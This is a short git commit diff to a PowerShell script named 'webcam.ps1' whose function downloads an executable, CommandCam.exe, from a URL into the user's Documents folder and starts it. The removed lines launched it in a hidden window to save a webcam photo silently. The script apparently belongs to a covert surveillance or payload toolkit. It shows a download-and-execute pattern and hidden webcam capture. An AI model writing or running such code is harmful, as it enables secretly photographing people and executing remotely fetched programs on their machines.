90d0e22969f774da17eed0a826097325d94de311
alexander carrareas <113837595+escamasbuen@users.noreply.github.com>
2023-06-09 21:35:30 +0200

    Update webcam.ps1

--- webcam.ps1
+++ webcam.ps1
@@ -4,7 +4,5 @@ function webcam {
     $outpath = "C:\Users\$env:username\Documents\CommandCam.exe"
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-WebRequest -Uri $url -OutFile $outpath
-
-    $args = "/filename C:\Users\$env:username\Documents\image.jpg"
-    Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
+    Start-Process $outpath
 }
